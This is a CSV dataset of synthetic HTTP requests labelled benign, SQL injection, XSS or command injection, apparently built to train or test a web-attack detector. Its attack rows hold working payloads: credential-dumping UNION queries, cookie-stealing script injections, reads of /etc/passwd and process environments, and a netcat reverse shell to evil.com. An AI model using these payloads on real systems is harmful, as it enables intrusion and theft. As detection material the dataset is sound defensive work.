method,url,headers,body,label
GET,/account/preferences?offset=41,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/dashboard/apps/16279/metrics"", ""x-forwarded-for"": ""10.250.32.170""}",,benign
GET,/login?q=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a),"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,sqli
PUT,/admin/settings/security?q=1%27%20OR%20%271%27%3D%271,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""title"": ""apartment"", ""username"": ""house"", ""quantity"": ""282""}",sqli
POST,/dashboard/apps/46021/metrics?offset=32&min=1683,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.57.209.110""}","{""comment"": ""textbook"", ""value"": ""book"", ""search"": ""vbscript:msgbox(1)"", ""description"": ""pizza""}",xss
GET,/categories/books/products?lang=de&limit=59,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/login""}",,benign
GET,/products/40017/reviews?format=json&q=java&page=10&ref=email,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.116.228.235""}",,benign
DELETE,/register,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*""}",,benign
POST,/items/42299?filter=cafe&format=csv,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""category"": ""ansible"", ""name"": ""resume"", ""value"": ""pizza""}",benign
PUT,/apps/92305/api/v1/items?min=1966&page=2&sort=rating&input=' OR 1=1; DROP TABLE users--,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/categories/books/products""}","{""category"": ""pizza"", ""description"": ""jacket""}",sqli
PUT,/apps/app-14061/dashboard?filter=tea,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""title"": ""shirt"", ""price"": ""150"", ""description"": ""tea""}",benign
PUT,/apps/536?filter=house,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.115.162.170""}","{""quantity"": ""481"", ""category"": ""trousers""}",benign
GET,/blog/2023/guide-linux-novel?format=csv&filter=javascript&brand=apple&search=%250acat%2520%2Fetc%2Fpasswd,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/categories/furniture/products""}",,cmdi
POST,/docs/watch-apartment-keyboard-howto?q=javascript:alert(1),"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register"", ""x-forwarded-for"": ""10.206.197.76""}","{""value"": ""guide"", ""price"": ""453"", ""description"": ""typescript""}",xss
POST,/checkout/cart?ref=search&filter=headphones&category=pets&limit=24,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""dog"", ""category"": ""jacket"", ""name"": ""obrien"", ""email"": ""electronics"", ""title"": ""cat""}",benign
PUT,/dashboard/apps/14246/metrics?min=634&category=toys&brand=asus,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/30573""}","{""value"": ""headphones"", ""username"": ""tea"", ""quantity"": ""111""}",benign
POST,/docs/rust-whiskas-tea?format=csv&lang=how%20to%20drop%20table%20weight%20effectively,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""quantity"": ""470"", ""description"": ""typescript"", ""category"": ""journal""}",benign
DELETE,/account/preferences?input=%250acat%2520%2Fetc%2Fpasswd,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*""}",,cmdi
POST,/categories/furniture/products?ref=social&page=30&format=json,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/categories/sports/products""}","{""category"": ""ansible"", ""username"": ""javascript"", ""value"": ""coffee"", ""title"": ""biography""}",benign
PUT,/admin/settings/security?max=87801&lang=ja,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/37913""}","{""email"": ""docker"", ""price"": ""472"", ""title"": ""journal"", ""value"": ""python""}",benign
GET,/products/88601/reviews?page=2&limit=id%20verification%20process,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/login""}",,benign
POST,/items/87294?brand=whiskas,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""rust"", ""username"": ""pizza"", ""title"": ""villa"", ""quantity"": ""315""}",benign
DELETE,/blog/2026/shoes-obrien-dress?brand=hp,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
GET,/categories/furniture/products?category=furniture,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.0.88.61""}",,benign
PUT,/login?category=clothing,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/99847/deploy""}","{""description"": ""java"", ""username"": ""diner"", ""category"": ""book""}",benign
PUT,/apps/5791/api/v1/items?min=4186&lang=es&format=xml&max=69847,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""name"": ""burger"", ""quantity"": ""31""}",benign
DELETE,/api/v1/users/28290/profile?brand=whiskas&max=13918&sort=popularity,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
PUT,/apps/app-62668/dashboard?category=books&page=35,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.76.170.94""}","{""name"": ""pet"", ""category"": ""rust""}",benign
GET,/categories/toys/products?q=1' HAVING 1=1--,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,sqli
PUT,/api/v1/users/8588/profile?q=cat%20%2Fetc%2Fresolvconf%20documentation,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""email"": ""linux"", ""description"": ""ansible"", ""name"": ""book"", ""quantity"": ""137"", ""username"": ""obrien""}",benign
POST,/products/57831/reviews?ref=email&max=22958&filter=docker&offset=449,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/blog/2026/juice-diner""}","{""quantity"": ""122"", ""username"": ""headphones"", ""email"": ""flat"", ""price"": ""448"", ""value"": ""whiskas""}",benign
DELETE,/dashboard/apps/80835/metrics?category=clothing,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json""}",,benign
PUT,/apps/86416?format=csv&input=%3Csvg%20onload%3Dalert%281%29%3E,"{""user-agent"": ""<svg onload=alert(1)>"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/blog/2024/cat-resume""}","{""value"": ""bag"", ""price"": ""335""}",xss
GET,/categories/clothing/products?limit=41&category=toys&format=csv,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/dashboard/apps/68801/metrics""}",,benign
DELETE,/login?min=exec chef meal prep service,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.65.47.135""}",,benign
GET,/api/v1/users/19291/profile?ref=search&brand=dell&filter=dog&offset=299,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
POST,/account/preferences?brand=hp&sort=price_asc,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""title"": ""laptop"", ""description"": ""textbook"", ""category"": ""villa"", ""email"": ""python""}",benign
GET,/api/apps/3902/deploy?ref=price > 100 & < 500&lang=fr&min=753,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*""}",,benign
POST,/apps/87169?filter=book,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/app-47429/dashboard""}","{""name"": ""camera"", ""description"": ""pet"", ""value"": ""typescript"", ""email"": ""golang"", ""title"": ""cafe""}",benign
GET,/api/v2/orders/39545/items?offset=194&filter=python,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/products/17040/reviews"", ""x-forwarded-for"": ""10.30.21.180""}",,benign
DELETE,"/apps/86673/api/v1/items?q=localhost | python -c 'import os;os.system(""id"")'","{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json""}",,cmdi
GET,/apps/22923/api/v1/items?q=Tom%27s%20Diner%20restaurant,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
POST,/products/2990/reviews?offset=330&max=91500&filter=villa&search=<img src=x onerror=alert(document.cookie)>,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""username"": ""pizza"", ""name"": ""ubuntu""}",xss
DELETE,/apps/37158?input=8.8.8.8%3B%20cat%20%2Fproc%2Fself%2Fenviron,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,cmdi
POST,/search?offset=299&q=tutorial,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.98.94.228""}","{""price"": ""468"", ""quantity"": ""105"", ""email"": ""textbook"", ""name"": ""kubernetes"", ""category"": ""house""}",benign
PUT,/api/v1/users/57838/profile?q=whiskas,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/79482/items""}","{""category"": ""terraform"", ""price"": ""469""}",benign
PUT,/categories/furniture/products?brand=whiskas&ref=social,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""email"": ""watch"", ""title"": ""cafe"", ""price"": ""142""}",benign
POST,/apps/48560/api/v1/items,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.235.45.177""}","{""email"": ""journal"", ""username"": ""kubernetes"", ""title"": ""tea"", ""name"": ""biography""}",benign
POST,/api/v1/users/74740/profile?category=electronics&sort=newest&lang=en&page=48,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""title"": ""linux"", ""value"": ""diner""}",benign
DELETE,/login?brand=philips&q=coffee,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/register""}",,benign
DELETE,/apps/app-22406/dashboard?q=jacket&page=48&format=xml&brand=lenovo,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.105.83.171""}",,benign
GET,"/items/77405?q=project&brand=sony&offset=297&input=';alert(String.fromCharCode(88,83,83))//","{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*""}",,xss
DELETE,/register,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.249.77.226""}",,benign
DELETE,/dashboard/apps/93949/metrics?limit=50&sort=newest,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*""}",,benign
PUT,/categories/clothing/products?category=toys,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/app-37376/dashboard"", ""x-forwarded-for"": ""10.203.247.114""}","{""name"": ""pet"", ""username"": ""cafe"", ""category"": ""shirt""}",benign
POST,/checkout/cart?ref=price%20%3E%20100%20%26%20%3C%20500&category=sports&lang=de&limit=87,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/docs/golang-shoes-pizza""}","{""value"": ""watch"", ""username"": ""food"", ""title"": ""cat"", ""quantity"": ""459""}",benign
GET,/search?lang=de,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.200.47.151""}",,benign
DELETE,/apps/65828?page=wget%20alternatives%20for%20windows,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*""}",,benign
GET,/docs/trousers-monitor?limit=30&brand=apple&input=' OR 1=1 LIMIT 1--,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,sqli
DELETE,/items/50714,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*""}",,benign
PUT,/api/apps/85383/deploy?brand=lg,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""price"": ""47"", ""quantity"": ""259"", ""category"": ""flat"", ""username"": ""java""}",benign
PUT,/api/v2/orders/86202/items?offset=428&brand=acer&category=electronics,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/81976/api/v1/items""}","{""price"": ""145"", ""name"": ""diner""}",benign
DELETE,/search?offset=128&max=13951&lang=javascript tutorial for beginners,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/products/96433/reviews""}",,benign
PUT,/admin/settings/security?q=<strong>sale</strong> ends today,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""value"": ""villa"", ""name"": ""journal"", ""description"": ""typescript"", ""title"": ""docker""}",benign
PUT,"/dashboard/apps/32009/metrics?format=csv&filter=smoothie&sort=price_asc&id=""><img src=1 onerror=alert(1)>","{""user-agent"": ""\""><img src=1 onerror=alert(1)>"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""description"": ""apartment"", ""quantity"": ""217"", ""title"": ""python"", ""category"": ""tea"", ""username"": ""golang""}",xss
POST,/checkout/cart?max=8657&sort=document.cookie policy explained,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/search""}","{""title"": ""ubuntu"", ""username"": ""biography"", ""price"": ""203""}",benign
PUT,/items/98194,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/search""}","{""quantity"": ""112"", ""username"": ""rust"", ""name"": ""ring"", ""value"": ""salad"", ""category"": ""electronics""}",benign
POST,/docs/camera-coffee?lang=fr,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""price"": ""111"", ""username"": ""jacket"", ""quantity"": ""140""}",benign
POST,/account/preferences?brand=hp,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/search""}","{""value"": ""1/**/UNION/**/SELECT/**/password/**/FROM/**/users"", ""description"": ""howto"", ""comment"": ""salad""}",sqli
GET,/checkout/cart?max=89613&lang=es,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/api/v1/users/4907/profile""}",,benign
GET,/products/115/reviews?format=O'Brien's cafe,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/products/50737/reviews?max=82924&sort=popularity,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/dashboard/apps/98249/metrics?offset=183,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*""}",,benign
GET,/items/67492?category=toys&q=cat,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.211.176.94""}",,benign
POST,/docs/tea-typescript-electronics-ring?category=pets&q=127.0.0.1 & nc -e /bin/sh evil.com 4444,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""javascript"", ""username"": ""electronics""}",cmdi
POST,/dashboard/apps/71458/metrics?q=ring,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/6385/items""}","{""name"": ""headphones"", ""title"": ""apartment""}",benign
PUT,/dashboard/apps/16308/metrics?limit=12&page=20&sort=price_asc,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.208.104.63""}","{""username"": ""javascript"", ""name"": ""electronics""}",benign
PUT,/api/v1/users/45077/profile,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""value"": ""jacket"", ""username"": ""textbook""}",benign
POST,/checkout/cart?q=%0acat%20/etc/passwd,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""username"": ""javascript"", ""category"": ""headphones"", ""quantity"": ""278"", ""description"": ""tutorial""}",cmdi
POST,/blog/2026/typescript-apartment?filter=cat,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/17108/items""}","{""email"": ""coffee"", ""title"": ""electronics"", ""description"": ""ubuntu""}",benign
GET,/api/v2/orders/88549/items?brand=acer&offset=170,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/login""}",,benign
GET,/admin/settings/security?page=18&min=1322&category=toys,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
PUT,/items/7670?sort=relevance&q=laptop&max=94404,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/dashboard/apps/80247/metrics"", ""x-forwarded-for"": ""10.66.39.123""}","{""username"": ""tea"", ""value"": ""house"", ""email"": ""ansible"", ""name"": ""biography"", ""title"": ""studio""}",benign
POST,/docs/novel-typescript?sort=price_desc&page=23,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.25.155.80""}","{""price"": ""435"", ""category"": ""howto"", ""email"": ""kubernetes""}",benign
GET,/apps/87924/api/v1/items?max=68051,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.68.191.159""}",,benign
DELETE,/api/v2/orders/73919/items?sort=rating&brand=order by date asc,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.209.207.196""}",,benign
GET,/apps/14061?lang=id verification process&q=dog,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/api/v2/orders/35888/items""}",,benign
POST,/api/v1/users/34775/profile,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""name"": ""biography"", ""category"": ""guide"", ""value"": ""portfolio"", ""quantity"": ""317""}",benign
POST,/dashboard/apps/68082/metrics?sort=price_asc&min=2655&lang=en&search=localhost%20%7C%20python%20-c%20%27import%20os%3Bos.system%28%22id%22%29%27,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/blog/2023/pizza-novel-project-pet"", ""x-forwarded-for"": ""10.115.235.191""}","{""username"": ""villa"", ""price"": ""317"", ""category"": ""java""}",cmdi
POST,/register?min=293,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v1/users/66193/profile""}","{""price"": ""44"", ""description"": ""python"", ""name"": ""watch"", ""title"": ""linux""}",benign
DELETE,/items/49291?offset=408&input=1%27%20AND%20SLEEP%285%29--,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json""}",,sqli
POST,/api/v1/users/17950/profile?page=27&min=1203&filter=portfolio,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""quantity"": ""282"", ""value"": ""cafe""}",benign
POST,/checkout/cart?limit=41&input=eval('alert(1)'),"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.238.135.128""}","{""value"": ""biography"", ""title"": ""portfolio""}",xss
POST,/api/v2/orders/17136/items?min=2805,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.36.128.176""}","{""email"": ""headphones"", ""price"": ""12""}",benign
GET,/api/v1/users/10230/profile?sort=rating,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/api/v2/orders/19046/items?q=1%27%20AND%20SLEEP%285%29--&page=20&lang=es,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml""}",,sqli
PUT,/items/81056,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""journal"", ""username"": ""cafe"", ""quantity"": ""96""}",benign
GET,/register?filter=apartment&id=<iframe src=javascript:alert(1)>,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,xss
PUT,/blog/2024/bag-headphones-rust-salad?id=1; EXEC xp_cmdshell('dir')--,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/dashboard/apps/59515/metrics"", ""x-forwarded-for"": ""10.53.245.52""}","{""email"": ""camera"", ""title"": ""shoes""}",sqli
PUT,/api/v1/users/46349/profile?ref=%3Cstrong%3Esale%3C%2Fstrong%3E%20ends%20today,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""description"": ""pizza"", ""value"": ""villa""}",benign
PUT,/apps/55570?min=4091,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""name"": ""resume"", ""username"": ""trousers"", ""title"": ""villa"", ""value"": ""smoothie""}",benign
POST,/api/v1/users/35544/profile?max=24920,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""username"": ""salad"", ""price"": ""344""}",benign
PUT,"/products/26374/reviews?q=1' UNION SELECT null,null,username,password FROM users--","{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""keyboard"", ""email"": ""monitor"", ""category"": ""coffee"", ""title"": ""tea""}",sqli
GET,/api/v1/users/4216/profile?min=2425&filter=ubuntu,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,benign
POST,/items/37760?max=48273&category=toys&search=vbscript:msgbox(1),"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""email"": ""salad"", ""description"": ""dress"", ""category"": ""whiskas""}",xss
DELETE,/items/48383?limit=41&brand=how to drop table weight effectively,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json""}",,benign
